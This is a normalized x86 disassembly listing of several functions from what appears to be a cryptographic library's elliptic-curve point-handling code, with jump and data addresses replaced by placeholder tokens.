push edi
call sub_10068ab0
add esp 0x10
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
jle r-xdata
test ecx ecx
jne r-xdata
mov eax 0x1
jmp r-xdata
call sub_1001df60
push 0x2d3
xor eax eax
mov ecx [ edi ]
test [ ecx ] 0x1
je r-xdata
push edi
push ebp
push edi
call sub_100387f0
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push esi
push ebp
push eax
call sub_10068840
add esp 0xc
cmp eax 0xfffffffe
je r-xdata
cmp [ esp + 0x30 ] eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x28 ]
push esi
push edi
push edx
push eax
push ebx
call sub_1002d4e0
add esp 0x14
test eax eax
je r-xdata
push 0x2ee
push r--data
push 0x44
push 0xa9
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov [ esp + 0x18 ] 0x1
cmp [ esp + 0x30 ] eax
je r-xdata
push 0x2e7
jmp r-xdata
push 0x2e4
push r--data
push 0x6d
push 0xa9
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
push r--data
push 0x6e
push 0xa9
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
sub_100629b0
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
cmp esi 0x2
push edi
mov [ esp + 0x14 ] 0x0
je r-xdata
mov eax [ esp + 0x20 ]
mov edi [ esp + 0x1c ]
push eax
push edi
call sub_1002d980
add esp 0x8
test eax eax
je r-xdata
cmp esi 0x4
je r-xdata
add edi 0x48
push edi
call sub_10029870
add eax 0x7
add esp 0x4
cdq
and edx 0x7
add eax edx
mov ebp eax
sar ebp 0x3
cmp esi 0x2
jne r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
cmp esi 0x6
je r-xdata
lea edx [ ebp + ebp + 0x1 ]
mov [ esp + 0x10 ] edx
lea ecx [ ebp + 0x1 ]
mov [ esp + 0x10 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
cmp [ esp + 0x2c ] 0x1
jae r-xdata
push 0x30b
push r--data
push 0x68
push 0x68
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x2c ]
cmp ecx eax
jae r-xdata
mov edi [ esp + 0x28 ]
test edi edi
je r-xdata
mov [ eax ] 0x0
push 0x316
push r--data
push 0x64
push 0x68
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov esi [ esp + 0x30 ]
test esi esi
jne r-xdata
push 0x328
push r--data
push 0x64
push 0x68
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov ebx eax
call sub_1002de70
mov esi eax
add esp 0xc
test esi esi
mov [ esp + 0x2c ] esi
je r-xdata
call sub_1002dc50
test eax eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x30 ] eax
jne r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call sub_1002de00
mov eax [ esp + 0x18 ]
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
push ecx
push esi
push ebx
push edx
push eax
call sub_1002d5b0
add esp 0x14
test eax eax
je r-xdata
mov esi [ esp + 0x30 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
push eax
call sub_1002dcb0
add esp 0x4
mov eax [ esp + 0x24 ]
cmp eax 0x2
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
jle r-xdata
cmp eax 0x6
jne r-xdata
push ebx
mov [ edi ] al
mov esi 0x1
call sub_10029870
add eax 0x7
add esp 0x4
cdq
and edx 0x7
add eax edx
mov edx ebp
sar eax 0x3
sub edx eax
cmp edx ebp
jbe r-xdata
mov ecx [ esi ]
test [ ecx ] 0x1
je r-xdata
test edx edx
jbe r-xdata
push 0x345
jmp r-xdata
inc al
lea edx [ esi + edi ]
push edx
push ebx
call sub_10029ef0
add esi eax
lea eax [ ebp + 0x1 ]
add esp 0x8
cmp esi eax
je r-xdata
mov ecx edx
inc edi
mov esi ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx esi
lea esi [ edx + 0x1 ]
and ecx 0x3
[ edi ]
mov edi [ esp + 0x28 ]
push r--data
push 0x44
push 0x68
push 0x10
call sub_1001de60
add esp 0x14
mov eax [ esp + 0x24 ]
cmp eax 0x4
je r-xdata
push 0x351
jmp r-xdata
mov ecx [ esp + 0x2c ]
push ecx
call sub_10029870
add eax 0x7
add esp 0x4
cdq
and edx 0x7
add eax edx
mov edx ebp
sar eax 0x3
sub edx eax
cmp edx ebp
jbe r-xdata
cmp eax 0x6
jne r-xdata
test edx edx
jbe r-xdata
push 0x35a
jmp r-xdata
cmp esi [ esp + 0x10 ]
je r-xdata
mov eax [ esp + 0x2c ]
lea edx [ esi + edi ]
push edx
push eax
call sub_10029ef0
add esp 0x8
add esi eax
mov ecx edx
add edi esi
mov ebx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
add esi edx
[ edi ]
mov edi [ esp + 0x28 ]
mov edx [ esp + 0x30 ]
push edx
call sub_1002de00
mov eax [ esp + 0x18 ]
add esp 0x4
test eax eax
je r-xdata
push 0x368
push eax
call sub_1002dcb0
add esp 0x4
sub_10062c90
mov eax 0xc
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x20 ]
push ebp
xor ebp ebp
push esi
cmp ebx ebp
push edi
mov [ esp + 0x14 ] ebp
mov [ esp + 0x18 ] ebp
jne r-xdata
mov ecx [ esp + 0x28 ]
xor eax eax
mov al [ ecx ]
mov esi eax
and eax 0x1
and esi 0xfffffffe
mov [ esp + 0x10 ] eax
je r-xdata
push 0x388
push r--data
push 0x64
push 0x67
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
cmp eax ebp
je r-xdata
cmp esi 0x2
je r-xdata
cmp esi ebp
jne r-xdata
push 0x397
jmp r-xdata
cmp esi 0x4
jne r-xdata
cmp esi 0x4
je r-xdata
mov ecx [ esp + 0x20 ]
lea eax [ ecx + 0x48 ]
push eax
call sub_10029870
add eax 0x7
add esp 0x4
cdq
and edx 0x7
add eax edx
mov edi eax
sar edi 0x3
cmp esi 0x2
lea eax [ edi + 0x1 ]
je r-xdata
cmp ebx 0x1
je r-xdata
push r--data
push 0x66
push 0x67
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
cmp esi 0x6
je r-xdata
cmp ebx eax
je r-xdata
lea eax [ edi + edi + 0x1 ]
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
push edx
push eax
call sub_1002d410
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
push 0x39f
jmp r-xdata
push 0x392
jmp r-xdata
mov ebx [ esp + 0x30 ]
cmp ebx ebp
jne r-xdata
push 0x3ab
push ebx
call sub_1002dd20
push ebx
call sub_1002de70
push ebx
mov [ esp + 0x38 ] eax
call sub_1002de70
mov ebp eax
add esp 0xc
test ebp ebp
je r-xdata
call sub_1002dc50
cmp eax ebp
mov [ esp + 0x14 ] eax
mov ebx eax
jne r-xdata
push ebx
call sub_1002de00
mov eax [ esp + 0x18 ]
add esp 0x4
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
push edx
inc eax
push edi
push eax
call sub_10029d50
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
push eax
call sub_1002dcb0
add esp 0x4
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x2c ]
lea eax [ ecx + 0x48 ]
push eax
push edx
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
cmp esi 0x2
jne r-xdata
push 0x3be
jmp r-xdata
mov eax [ esp + 0x28 ]
push ebp
push edi
lea ecx [ edi + eax + 0x1 ]
push ecx
call sub_10029d50
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push ebx
push eax
push ecx
push esi
push edx
call sub_1002d680
add esp 0x14
test eax eax
je r-xdata
push r--data
push 0x66
push 0x67
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov edx [ esp + 0x20 ]
lea eax [ edx + 0x48 ]
push eax
push ebp
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
jmp r-xdata
cmp esi 0x6
jne r-xdata
push 0x3cb
jmp r-xdata
mov eax [ esp + 0x20 ]
push ebx
push esi
push eax
call sub_1002d9e0
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push ebx
push ebp
push ecx
push esi
push edx
call sub_1002d4e0
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
test eax eax
jle r-xdata
mov [ esp + 0x18 ] 0x1
push 0x3dc
push r--data
push 0x6b
push 0x67
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
xor eax eax
mov eax [ ebp ]
test [ eax ] 0x1
je r-xdata
push 0x3d2
mov eax 0x1
jmp r-xdata
cmp [ esp + 0x10 ] eax
je r-xdata
sub_10062f30
mov eax 0x20
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x38 ]
push esi
mov esi [ esp + 0x38 ]
push edi
xor edi edi
cmp esi ebp
mov [ esp + 0x2c ] edi
mov [ esp + 0x28 ] edi
jne r-xdata
mov ebx [ esp + 0x34 ]
push esi
push ebx
call sub_1002d980
add esp 0x8
test eax eax
push ebp
je r-xdata
mov eax [ esp + 0x44 ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
push eax
push esi
push ecx
push edx
call sub_1002d8b0
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push ebx
call sub_1002d980
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x3c ]
push eax
call sub_1002d270
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov eax [ ebx ]
mov esi [ esp + 0x44 ]
cmp esi edi
mov ebp [ eax + 0x80 ]
mov edx [ eax + 0x84 ]
lea eax [ ebx + 0x48 ]
mov [ esp + 0x20 ] edx
mov [ esp + 0x34 ] eax
jne r-xdata
mov ecx [ esp + 0x38 ]
push esi
push ecx
call sub_1002d270
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov edi eax
call sub_1002de70
push esi
mov [ esp + 0x28 ] eax
call sub_1002de70
push esi
mov [ esp + 0x30 ] eax
call sub_1002de70
push esi
mov [ esp + 0x5c ] eax
call sub_1002de70
push esi
mov [ esp + 0x2c ] eax
call sub_1002de70
push esi
mov [ esp + 0x34 ] eax
call sub_1002de70
add esp 0x20
mov [ esp + 0x24 ] eax
test eax eax
je r-xdata
call sub_1002dc50
cmp eax edi
mov [ esp + 0x2c ] eax
mov esi eax
jne r-xdata
test esi esi
je r-xdata
mov eax [ esp + 0x40 ]
mov ecx [ eax + 0x40 ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x2c ]
test eax eax
je r-xdata
push esi
call sub_1002de00
add esp 0x4
add eax 0x2c
push esi
push eax
push edi
push ebx
call [ esp + 0x30 ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x18 ]
add ecx 0x4
push ecx
push edx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push eax
call sub_1002dcb0
add esp 0x4
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x18 ]
push esi
add edx 0x4
push edi
push edx
push eax
push ebx
call ebp
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x1c ]
add eax 0x18
push eax
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
push esi
lea eax [ ecx + 0x2c ]
push eax
push edi
push edi
push ebx
call ebp
add esp 0x14
test eax eax
je r-xdata
jmp r-xdata
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x1c ]
push esi
add edx 0x18
push edi
push edx
push eax
push ebx
call ebp
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ eax + 0x40 ]
test ecx ecx
je r-xdata
add eax 0x2c
push esi
push eax
push edi
push ebx
call [ esp + 0x30 ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
add ecx 0x4
push ecx
push edx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x40 ]
mov eax [ esp + 0x44 ]
push esi
add edx 0x4
push edi
push edx
push eax
push ebx
call ebp
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x10 ]
add eax 0x18
push eax
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x3c ]
push esi
lea eax [ ecx + 0x2c ]
push eax
push edi
push edi
push ebx
call ebp
add esp 0x14
test eax eax
je r-xdata
jmp r-xdata
mov edx [ esp + 0x40 ]
mov eax [ esp + 0x10 ]
push esi
add edx 0x18
push edi
push edx
push eax
push ebx
call ebp
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x18 ]
push edx
push eax
push ecx
call sub_10057ad0
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x28 ]
push eax
push ecx
push edx
call sub_10057ad0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x44 ]
push edx
push eax
mov eax [ esp + 0x20 ]
push eax
push eax
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x1c ]
push ecx
push edx
push eax
push eax
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
mov edi [ esp + 0x38 ]
push 0x0
lea ecx [ edi + 0x2c ]
push ecx
call sub_10029cf0
add esp 0x8
mov [ edi + 0x40 ] 0x0
jmp r-xdata
push esi
call sub_1002de00
mov edx [ esp + 0x40 ]
mov eax [ esp + 0x3c ]
push esi
push edx
push eax
push ebx
call sub_1002d8b0
add esp 0x14
mov [ esp + 0x28 ] eax
jmp r-xdata
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x40 ]
mov edx [ ecx + 0x40 ]
test edx edx
je r-xdata
mov [ esp + 0x28 ] 0x1
test edx edx
je r-xdata
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov edx [ eax + 0x40 ]
test edx edx
je r-xdata
add eax 0x2c
push eax
mov ecx [ esp + 0x38 ]
mov eax [ esp + 0x14 ]
add ecx 0x2c
push eax
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
add eax 0x2c
push esi
add ecx 0x2c
push eax
push ecx
push edi
push ebx
call ebp
add esp 0x14
test eax eax
je r-xdata
add ecx 0x2c
push ecx
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x38 ]
push esi
push edx
add eax 0x2c
push edi
push eax
push ebx
call ebp
add esp 0x14
test eax eax
je r-xdata
push edi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x38 ]
push esi
push edx
push edi
push ebx
mov [ ecx + 0x40 ] 0x0
call [ esp + 0x30 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
push esi
push eax
push ecx
push ebx
call [ esp + 0x30 ]
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x44 ]
push esi
push edx
push eax
push ecx
push ebx
call ebp
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x38 ]
mov ecx [ esp + 0x34 ]
push ecx
lea eax [ edx + 0x4 ]
mov edx [ esp + 0x48 ]
push edx
push edi
push eax
call sub_10057ad0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x38 ]
push eax
lea eax [ ecx + 0x4 ]
push eax
push edi
call sub_10057bf0
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x44 ]
push edx
push edi
push eax
push edi
call sub_10057ad0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x24 ]
push esi
push ecx
push edi
push edi
push ebx
call ebp
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push esi
push eax
push edx
push eax
push ebx
call ebp
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push esi
push eax
push ecx
push edx
push ebx
call ebp
add esp 0x14
test eax eax
je r-xdata
mov ebx [ esp + 0x34 ]
mov eax [ esp + 0x18 ]
push ebx
push eax
push edi
push edi
call sub_10057ad0
add esp 0x10
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
jle r-xdata
mov edx [ esp + 0x38 ]
push edi
add edx 0x18
push edx
call sub_10035de0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ edi ]
test [ ecx ] 0x1
je r-xdata
push ebx
push edi
push edi
call sub_10038680
add esp 0xc
test eax eax
je r-xdata
sub_100634a0
mov eax 0x18
call sub_1001d0d0
mov eax [ esp + 0x24 ]
push ebx
mov ebx [ esp + 0x20 ]
push esi
push edi
xor edi edi
push eax
push ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] edi
call sub_1002d980
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebx ]
mov esi [ esp + 0x34 ]
lea ecx [ ebx + 0x48 ]
cmp esi edi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x84 ]
mov [ esp + 0x10 ] edx
mov [ esp + 0xc ] eax
mov [ esp + 0x28 ] ecx
jne r-xdata
mov esi [ esp + 0x2c ]
push edi
lea ecx [ esi + 0x2c ]
push ecx
call sub_10029cf0
add esp 0x8
mov [ esi + 0x40 ] edi
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x18
retn
push ebp
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov edi eax
call sub_1002de70
push esi
mov ebp eax
call sub_1002de70
push esi
mov [ esp + 0x4c ] eax
call sub_1002de70
add esp 0x14
mov [ esp + 0x18 ] eax
test eax eax
je r-xdata
call sub_1002dc50
cmp eax edi
mov [ esp + 0x1c ] eax
mov esi eax
jne r-xdata
mov edi [ esp + 0x24 ]
mov eax [ esp + 0x34 ]
mov ecx [ eax + 0x40 ]
test ecx ecx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x18
retn
mov eax edi
pop edi
pop esi
pop ebx
add esp 0x18
retn
push eax
call sub_1002dcb0
add esp 0x4
mov ecx [ ebx + 0x98 ]
test ecx ecx
je r-xdata
add eax 0x4
push esi
push eax
push edi
push ebx
mov [ esp + 0x2c ] eax
call [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
add eax 0x4
push esi
push eax
push edi
push ebx
mov [ esp + 0x2c ] eax
call [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
add eax 0x2c
push esi
push eax
push ebp
push ebx
call [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
push edx
push edi
push ebp
call sub_10057bf0
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
push edx
push edi
push ebp
call sub_10057bf0
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x2c ]
add eax 0x4
push ecx
push ebp
push eax
push edi
mov [ esp + 0x2c ] eax
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
push eax
push ebp
push edi
push edi
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
push eax
push ebp
push edi
push edi
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x38 ]
push edx
push ebp
push eax
push ecx
call sub_10057ad0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
lea edx [ ebx + 0x70 ]
push ecx
push edx
mov ecx [ esp + 0x34 ]
push esi
add ecx 0x2c
push ecx
push ebp
push ebx
call [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x38 ]
push esi
push edx
push edi
push ebp
push ebx
call [ esp + 0x28 ]
add esp 0x14
test eax eax
je r-xdata
jmp r-xdata
push esi
push ebp
push ebp
push ebx
call [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
push eax
push ebp
push edi
call sub_10057bf0
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ eax + 0x40 ]
test ecx ecx
je r-xdata
lea edx [ ebx + 0x70 ]
push esi
push edx
push ebp
push ebp
push ebx
call [ esp + 0x28 ]
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
push ecx
push ebp
jmp r-xdata
lea ecx [ eax + 0x18 ]
add eax 0x2c
push esi
push eax
push ecx
push edi
push ebx
mov [ esp + 0x48 ] ecx
call [ esp + 0x28 ]
add esp 0x14
test eax eax
je r-xdata
add eax 0x18
push eax
push edi
mov [ esp + 0x3c ] eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
push eax
push edi
push ebp
push ebp
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
push edi
push ebp
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x30 ]
push ecx
add edx 0x2c
push edi
push edx
call sub_10057bf0
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x30 ]
push esi
push ecx
push edx
push ebx
mov [ eax + 0x40 ] 0x0
call [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x38 ]
push esi
push eax
push ecx
push edx
push ebx
call [ esp + 0x28 ]
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
push eax
mov eax [ esp + 0x3c ]
push 0x2
push eax
push eax
call sub_10057c40
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x38 ]
push ecx
push edx
push edi
call sub_10057bf0
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
push esi
add eax 0x4
push ebp
push eax
push ebx
call [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x30 ]
mov ecx [ esp + 0x2c ]
push ecx
push edi
lea eax [ edx + 0x4 ]
push eax
push eax
call sub_10057ad0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
push esi
push eax
push edi
push ebx
call [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x18 ]
push ecx
push 0x3
push edi
push edx
call sub_10057c40
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x38 ]
push eax
lea eax [ ecx + 0x4 ]
push eax
push edx
push edi
call sub_10057ad0
add esp 0x10
test eax eax
je r-xdata
push esi
push edi
push ebp
push edi
push ebx
call [ esp + 0x28 ]
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x30 ]
push eax
push ecx
add edx 0x18
push edi
push edx
call sub_10057ad0
add esp 0x10
mov edi 0x1
test eax eax
jne r-xdata
push esi
call sub_1002de00
mov eax [ esp + 0x24 ]
add esp 0x4
test eax eax
pop ebp
je r-xdata
sub_100638e0
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push esi
push edi
call sub_1002d980
add esp 0x8
test eax eax
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
lea eax [ esi + 0x18 ]
add edi 0x48
push eax
push edi
push eax
call sub_100387f0
add esp 0xc
pop edi
pop esi
retn
sub_10063920
mov eax 0x10
call sub_1001d0d0
mov eax [ esp + 0x18 ]
push esi
push edi
mov edi [ esp + 0x1c ]
push eax
push edi
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] 0xffffffff
call sub_1002d980
add esp 0x8
test eax eax
je r-xdata
mov eax [ edi ]
mov esi [ esp + 0x24 ]
test esi esi
mov ecx [ eax + 0x80 ]
mov edx [ eax + 0x84 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x8 ] edx
jne r-xdata
pop edi
mov eax 0x1
pop esi
add esp 0x10
retn
push ebx
push ebp
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov ebx eax
call sub_1002de70
push esi
mov ebp eax
call sub_1002de70
push esi
mov [ esp + 0x40 ] eax
call sub_1002de70
add esp 0x14
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
call sub_1002dc50
test eax eax
mov [ esp + 0x10 ] eax
mov esi eax
jne r-xdata
mov edi [ esp + 0x1c ]
mov eax [ esp + 0x28 ]
push esi
add eax 0x4
push eax
push ebx
push edi
call [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0x10
retn
mov eax edi
pop edi
pop esi
add esp 0x10
retn
push eax
call sub_1002dcb0
add esp 0x4
mov eax [ esp + 0x28 ]
mov ecx [ eax + 0x40 ]
test ecx ecx
jne r-xdata
lea eax [ edi + 0x48 ]
push eax
lea eax [ edi + 0x70 ]
push eax
push ebx
push ebx
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
add eax 0x2c
push esi
push eax
push ebp
push edi
call [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
push esi
lea eax [ ecx + 0x4 ]
push eax
push ebx
push ebx
push edi
call [ esp + 0x38 ]
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
push esi
push ebp
push ecx
push edi
call [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ edi + 0x48 ]
lea edx [ edi + 0x84 ]
push eax
push edx
push ebx
push ebx
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x14 ]
push esi
push ebp
push edx
push eax
push edi
call [ esp + 0x38 ]
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
push esi
add eax 0x18
push eax
push ebp
push edi
call [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ edi + 0x98 ]
test eax eax
je r-xdata
push ebx
push ebp
call sub_10029fb0
mov edi eax
add esp 0x8
neg edi
sbb edi edi
inc edi
jmp r-xdata
mov edx [ esp + 0x2c ]
lea ecx [ edi + 0x70 ]
push esi
push ecx
push edx
push ebp
push edi
call [ esp + 0x38 ]
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
lea eax [ edi + 0x48 ]
push eax
push ecx
push ebp
call sub_10057bf0
add esp 0xc
test eax eax
je r-xdata
push esi
call sub_1002de00
mov eax [ esp + 0x1c ]
add esp 0x4
test eax eax
pop ebp
pop ebx
je r-xdata
lea eax [ edi + 0x48 ]
push eax
push ebp
push ebx
push ebx
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
lea eax [ edi + 0x48 ]
push eax
push edx
push ebp
push ebp
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
push esi
add eax 0x4
push eax
push ebx
push ebx
push edi
call [ esp + 0x38 ]
